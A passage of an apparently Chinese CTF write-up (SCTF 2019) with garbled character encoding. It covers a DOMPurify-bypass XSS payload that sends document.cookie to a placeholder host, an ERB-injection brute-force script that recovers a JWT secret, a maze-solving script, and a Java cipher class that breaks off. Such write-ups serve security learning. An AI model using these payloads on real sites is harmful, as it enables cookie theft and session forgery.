<p>çŒœæµ‹æ˜¯è¦è¦†ç›–DOMPurifyçš„æŸäº›å˜é‡ï¼Œèƒ½å¤Ÿä½¿å…¶å¤±æ•ˆï¼Œç¿»çœ‹Dompurifyçš„æºç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;cure53&#x2F;DOMPurify&#x2F;blob&#x2F;c57dd450d8613fddfda67ad182526f371b4638fd&#x2F;src&#x2F;purify.js :966</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/2019-sctf-1.png" alt=""><br>å½“<code>DOMPurify.isSupported</code>ä¸º<code>false</code>ï¼Œåˆ™èƒ½å¤Ÿç»•è¿‡è¿‡æ»¤<br>äºæ˜¯æ„é€ <br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=a;alert(<span class="number">1</span>);%<span class="number">0</span>aDOMPurify[%<span class="number">27</span>isSupported%<span class="number">27</span>]%<span class="number">3</span>dfalse&amp;text=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)</span></span><br></pre></td></tr></table></figure></p>
<p>æŠŠ<code>DOMPurify.isSupported</code>è®¾ç½®ä¸ºfalseï¼Œtextå‚æ•°çš„å€¼å°±èƒ½ç›´æ¥æ’å…¥é¡µé¢ä¸­ï¼Œé€ æˆxss<br>ï¼ˆè¿™é‡Œä¸çŸ¥é“ä¸ºå•¥<code>text=&lt;script&gt;alert(1)</code>ç›´æ¥å°±ç»•è¿‡cspå¼¹çª—äº†ï¼Œå¯èƒ½æ˜¯éé¢„æœŸ<br><img src="/img/2019-sctf-2.png" alt=""></p>
<p>æœ€åpayloadï¼š<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=a;alert(<span class="number">1</span>);%<span class="number">0</span>aDOMPurify[%<span class="number">27</span>isSupported%<span class="number">27</span>]%<span class="number">3</span>dfalse&amp;text=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href%<span class="number">3</span>d<span class="string">"http://xxxx.xxxx/?a%3d"</span>%<span class="number">2</span>bescape(<span class="built_in">document</span>.cookie)</span></span></span><br></pre></td></tr></table></figure></p>
<p>ä¸¤é¢˜éƒ½å¯ä»¥ç”¨è¿™ä¸ªpaylaodæ‰“<br><img src="/img/2019-sctf-3.png" alt=""></p>
<h2 id="math-is-fun2"><a href="#math-is-fun2" class="headerlink" title="math-is-fun2"></a>math-is-fun2</h2><p>é¢˜è§£åŒä¸Šï¼Œ<br>payloadï¼š<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=a;alert(<span class="number">1</span>);%<span class="number">0</span>aDOMPurify[%<span class="number">27</span>isSupported%<span class="number">27</span>]%<span class="number">3</span>dfalse&amp;text=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href%<span class="number">3</span>d<span class="string">"http://xxxx.xxxx/?a%3d"</span>%<span class="number">2</span>bescape(<span class="built_in">document</span>.cookie)</span></span></span><br></pre></td></tr></table></figure></p>
<h2 id="flag-shop"><a href="#flag-shop" class="headerlink" title="flag shop"></a>flag shop</h2><p>robots.txtæç¤º/filebakï¼Œè®¿é—®åæ‹¿åˆ°æºç ï¼š<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/cookies'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/json'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'jwt'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'securerandom'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'erb'</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/static'</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line"><span class="comment">#ENV["SECRET"] = SecureRandom.hex(xx)</span></span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line"> enable <span class="symbol">:logging</span></span><br><span class="line"> file = File.new(File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/../log/http.log'</span>,<span class="string">"a+"</span>)</span><br><span class="line"> file.sync = <span class="literal">true</span></span><br><span class="line"> use Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/"</span> <span class="keyword">do</span></span><br><span class="line"> redirect <span class="string">'/shop'</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/filebak"</span> <span class="keyword">do</span></span><br><span class="line"> content_type <span class="symbol">:text</span></span><br><span class="line"> erb IO.binread __FILE_<span class="number">_</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/auth"</span> <span class="keyword">do</span></span><br><span class="line"> payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line"> auth = JWT.encode payload,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line"> cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/info"</span> <span class="keyword">do</span></span><br><span class="line"> islogin</span><br><span class="line"> auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line"> json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">"uid"</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line"> erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/work"</span> <span class="keyword">do</span></span><br><span class="line"> islogin</span><br><span class="line"> auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line"> auth = auth[<span class="number">0</span>]</span><br><span class="line"> <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">   <span class="keyword">if</span> ENV[<span class="string">"SECRET"</span>].match(<span class="string">"<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>"</span>)</span><br><span class="line">     puts ENV[<span class="string">"FLAG"</span>]</span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"> <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">"<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working"</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">   auth[<span class="string">"jkl"</span>] = auth[<span class="string">"jkl"</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">   auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">   cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">   ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!')&lt;/script&gt;"</span>).result</span><br><span class="line"></span><br><span class="line"> <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line"> islogin</span><br><span class="line"> auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>] &lt; FLAGPRICE <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">   json(&#123;<span class="symbol">title:</span> <span class="string">"error"</span>,<span class="symbol">message:</span> <span class="string">"no enough jkl"</span>&#125;)</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">   auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">"FLAG"</span>]&#125;</span><br><span class="line">   auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">   cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">   json(&#123;<span class="symbol">title:</span> <span class="string">"success"</span>,<span class="symbol">message:</span> <span class="string">"jkl is good thing"</span>&#125;)</span><br><span class="line"> <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line"> <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">   redirect to(<span class="string">'/shop'</span>)</span><br><span class="line"> <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>
<p>å‘ç°<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!')&lt;/script&gt;"</span>).result</span><br></pre></td></tr></table></figure></p>
<p>å­˜åœ¨erbæ¨¡ç‰ˆæ³¨å…¥ï¼Œæ„é€ nameä¸º <code>&lt;%=$~%&gt;</code>ï¼Œdoä¸º<code>&lt;%=$~%&gt; is working</code>ï¼Œç»“åˆ<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENV[<span class="string">"SECRET"</span>].match(<span class="string">"<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>"</span>)ï¼Œ</span><br></pre></td></tr></table></figure></p>
<p>å…¶ä¸­çš„<code>SECRET</code>å‚æ•°å¯æ§ï¼Œå¦‚æœåŒ¹é…åˆ°SECRETï¼Œåˆ™<code>$~</code>(rubyç‰¹æ€§ï¼Œè¡¨ç¤ºæœ€è¿‘ä¸€æ¬¡æ­£åˆ™åŒ¹é…ç»“æœ) ä¼šåœ¨é¡µé¢ä¸­è¿”å›ï¼Œäºæ˜¯å¯ä»¥çˆ†ç ´secretï¼Œç„¶åä¼ªé€ JWTå»ä¹°flagã€‚<br>çˆ†ç ´è„šæœ¬å¦‚ä¸‹ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.110.15.101"</span></span><br><span class="line">re = requests.session()</span><br><span class="line">re.get(url + <span class="string">"/api/auth"</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">"09810e652ce9fa4882fe4875c"</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   i = <span class="string">""</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">       <span class="comment">#now = flag + i</span></span><br><span class="line">       now = i + flag</span><br><span class="line">       res = re.get(url + <span class="string">"/work?name=%3c%25%3d%24%7e%25%3e&amp;do=%3c%25%3d%24%7e%25%3e%20is%20working&amp;SECRET="</span>+now)</span><br><span class="line">       <span class="keyword">if</span> len(res.text) &gt; <span class="number">48</span>:</span><br><span class="line">           <span class="keyword">print</span> res.text</span><br><span class="line">           <span class="keyword">print</span> flag</span><br><span class="line">           flag = now</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><br><img src="/img/2019-sctf-4.png" alt=""><br>æ‹¿åˆ°SECRETåå°±æ˜¯ä¼ªé€ cookieå»ä¹°flagäº†<br><img src="/img/2019-sctf-5.png" alt=""><br><img src="/img/2019-sctf-6.png" alt=""></p>
<h2 id="Maaaaaaze"><a href="#Maaaaaaze" class="headerlink" title="Maaaaaaze"></a>Maaaaaaze</h2><p>é¢˜ç›®æ„æ€æ˜¯æ‰¾100*100çš„è¿·å®«ä¸­ä»»æ„ä¸¤ç‚¹æœ€å¤§è·¯å¾„<br>äºæ˜¯æŠŠhtmlå¤„ç†ä¸€ä¸‹ï¼Œç„¶åä»»æ„å–ä¸€ä¸ªç‚¹ä½œä¸ºèµ·ç‚¹ï¼Œæ‰”åˆ°dfsé‡Œè·‘æœ€é•¿è·¯å¾„ï¼Œç­‰è·‘ä¸åŠ¨çš„æ—¶å€™æ‹¿å½“å‰æœ€é•¿è·¯å¾„çš„é‡ç‚¹ä½œä¸ºèµ·ç‚¹å†æ‰”è¿›dfså»è·‘ï¼Œæœ€åå°±å¾—åˆ°ç­”æ¡ˆ<code>4056</code>äº†<br>è„šæœ¬å¦‚ä¸‹ï¼ˆå¥½ä¹…æ²¡å†™ç®—æ³•äº†è¿˜çœŸæœ‰ç‚¹æ‰‹ç”Ÿï¼‰ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.setrecursionlimit(<span class="number">100000</span>)</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">"sctfmaze.txt"</span>)</span><br><span class="line">maze = [[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100</span>)]</span><br><span class="line">vis = [[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100</span>)]</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span>:</span></span><br><span class="line">   t = <span class="number">0</span></span><br><span class="line">   r = <span class="number">0</span></span><br><span class="line">   b = <span class="number">0</span></span><br><span class="line">   l = <span class="number">0</span></span><br><span class="line"><span class="comment">#print maze</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">   a = line[:<span class="number">-1</span>].split(<span class="string">" "</span>)</span><br><span class="line">   <span class="comment">#print a</span></span><br><span class="line">   n = Node()</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,len(a)):</span><br><span class="line">       <span class="comment">#print a[i],</span></span><br><span class="line">       <span class="keyword">if</span> a[i] == <span class="string">'0'</span> :</span><br><span class="line">           n.t = <span class="number">1</span></span><br><span class="line">       <span class="keyword">if</span> a[i] == <span class="string">'1'</span> :</span><br><span class="line">           n.r = <span class="number">1</span></span><br><span class="line">       <span class="keyword">if</span> a[i] == <span class="string">'2'</span> :</span><br><span class="line">           n.b = <span class="number">1</span></span><br><span class="line">       <span class="keyword">if</span> a[i] == <span class="string">'3'</span> :</span><br><span class="line">           n.l = <span class="number">1</span></span><br><span class="line">       <span class="comment">#print a[i],</span></span><br><span class="line">   <span class="comment">#print</span></span><br><span class="line">   maze[int(a[<span class="number">0</span>])][int(a[<span class="number">1</span>])] = n</span><br><span class="line">   <span class="comment">#print a[0],a[1],maze[int(a[0])][int(a[1])].b</span></span><br><span class="line"><span class="comment">#exit()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(i,j)</span>:</span></span><br><span class="line">   <span class="keyword">if</span> i&gt;=<span class="number">100</span> <span class="keyword">or</span> i&lt;<span class="number">0</span> <span class="keyword">or</span> j&gt;=<span class="number">100</span> <span class="keyword">or</span> j&lt;<span class="number">0</span>:</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">   <span class="keyword">if</span> vis[i][j] == <span class="number">1</span>:</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printmap</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">global</span> vis</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">       <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">           <span class="keyword">if</span> vis[i][j] == <span class="number">1</span>:</span><br><span class="line">               <span class="keyword">print</span> <span class="string">"%2d%2d"</span> % (i,j)</span><br><span class="line">           <span class="keyword">print</span> <span class="string">"    "</span></span><br><span class="line"></span><br><span class="line">maxx = <span class="number">0</span></span><br><span class="line"><span class="keyword">print</span> maxx,i,j</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(i,j,n)</span>:</span></span><br><span class="line">   <span class="keyword">global</span> maxx</span><br><span class="line">   <span class="keyword">global</span> vis</span><br><span class="line">   <span class="keyword">global</span> maze</span><br><span class="line">   n += <span class="number">1</span></span><br><span class="line">  </span><br><span class="line">   <span class="comment">#print maxx,i,j,n,maze[i][j].t,maze[i][j].r,maze[i][j].b,maze[i][j].l</span></span><br><span class="line">   <span class="keyword">if</span> n&gt;maxx:</span><br><span class="line">       <span class="keyword">print</span> n,i,j</span><br><span class="line">       <span class="comment">#print n,i,j,maze[i][j].t,maze[i][j].r,maze[i][j].b,maze[i][j].l</span></span><br><span class="line">  </span><br><span class="line">       maxx = n</span><br><span class="line">   <span class="keyword">if</span> check(i<span class="number">-1</span>,j) <span class="keyword">and</span> maze[i][j].t == <span class="number">0</span>:</span><br><span class="line">       vis[i<span class="number">-1</span>][j] = <span class="number">1</span></span><br><span class="line">       dfs(i<span class="number">-1</span>,j,n)</span><br><span class="line">       vis[i<span class="number">-1</span>][j] = <span class="number">0</span></span><br><span class="line">   <span class="keyword">if</span> check(i,j+<span class="number">1</span>) <span class="keyword">and</span> maze[i][j].r == <span class="number">0</span>:</span><br><span class="line">       vis[i][j+<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">       dfs(i,j+<span class="number">1</span>,n)</span><br><span class="line">       vis[i][j+<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">   <span class="keyword">if</span> check(i+<span class="number">1</span>,j) <span class="keyword">and</span> maze[i][j].b == <span class="number">0</span>:</span><br><span class="line">       vis[i+<span class="number">1</span>][j] = <span class="number">1</span></span><br><span class="line">       dfs(i+<span class="number">1</span>,j,n)</span><br><span class="line">       vis[i+<span class="number">1</span>][j] = <span class="number">0</span></span><br><span class="line">   <span class="keyword">if</span> check(i,j<span class="number">-1</span>) <span class="keyword">and</span> maze[i][j].l == <span class="number">0</span>:</span><br><span class="line">       vis[i][j<span class="number">-1</span>] = <span class="number">1</span></span><br><span class="line">       dfs(i,j<span class="number">-1</span>,n)</span><br><span class="line">       vis[i][j<span class="number">-1</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">vis[<span class="number">70</span>][<span class="number">22</span>] = <span class="number">1</span></span><br><span class="line">dfs(<span class="number">70</span>,<span class="number">22</span>,<span class="number">0</span>)</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">   <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">       <span class="comment">#print i,j</span></span><br><span class="line">       vis[i][j] = <span class="number">1</span></span><br><span class="line">       dfs(i,j,<span class="number">0</span>)</span><br><span class="line">       vis[i][j] = <span class="number">0</span></span><br></pre></td></tr></table></figure></p>
<h2 id="music"><a href="#music" class="headerlink" title="music"></a>music</h2><p>è¿™æ˜¯é“é€†å‘é¢˜ï¼Œå‰é¢æ˜¯é˜Ÿå‹åšçš„ï¼Œåˆ°æˆ‘è¿™ç»™äº†æˆ‘ä¸€ä¸ªjavaçš„åŠ å¯†ç±»å’Œå¯†æ–‡ä¸å¯†é’¥ï¼Œè¦æ±‚è§£å‡ºæ˜æ–‡<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">c</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> m = <span class="number">256</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">a</span><span class="params">(String paramString1, String paramString2)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = m;</span><br><span class="line">    <span class="keyword">int</span>[] arrayOfInt = <span class="keyword">new</span> <span class="keyword">int</span>[i];</span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[i];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      arrayOfInt[i] = i;</span><br><span class="line">      arrayOfByte[i] = ((<span class="keyword">byte</span>)(<span class="keyword">byte</span>)paramString2.charAt(i % paramString2.length()));</span><br><span class="line">    &#125;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      k = m;</span><br><span class="line">      <span class="keyword">if</span> (i &gt;= k - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      j = (arrayOfInt[i] + j + arrayOfByte[i]) % k;</span><br><span class="line">      k = arrayOfInt[i];</span><br><span class="line">      arrayOfInt[i] = arrayOfInt[j];</span><br><span class="line">      arrayOfInt[j] = k;</span><br><span class="line">      i++;</span><br><span class="line">    &#125;</span><br><span class="line">    paramString2 = paramString1.toCharArray();</span><br><span class="line">    paramString1 = <span class="keyword">new</span> <span class="keyword">char</span>[paramString1.length()];</span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; paramString2.length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> n = m;</span><br><span class="line">      k = (k + <span class="number">1</span>) % n;</span><br><span class="line">      j = (arrayOfInt[k] + j) % n;</span><br><span class="line">      <span class="keyword">int</span> i1 = arrayOfInt[k];</span><br><span class="line">      arrayOfInt[k] = arrayOfInt[j];</span><br><span class="line">      arrayOfInt[j] = i1;</span><br><span class="line">      <span class="keyword">int</span> i2 = arrayOfInt[k];</span><br><span class="line">      i1 = arrayOfInt[k];</span><br><span class="line">      paramString1[i] = ((<span class="keyword">char</span>)(<span class="keyword">char</span>)(paramString2[i] - k ^ (<span class="keyword">char</span>)arrayOfInt[((i2 + i1 % n) % n)]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">new</span> p();</span><br><span class="line">    <span class="keyword">return</span> p.a(<span class="keyword">new</span> String(paramString1).getBytes());</span><br><span class="line">  &#125;</span><br><span 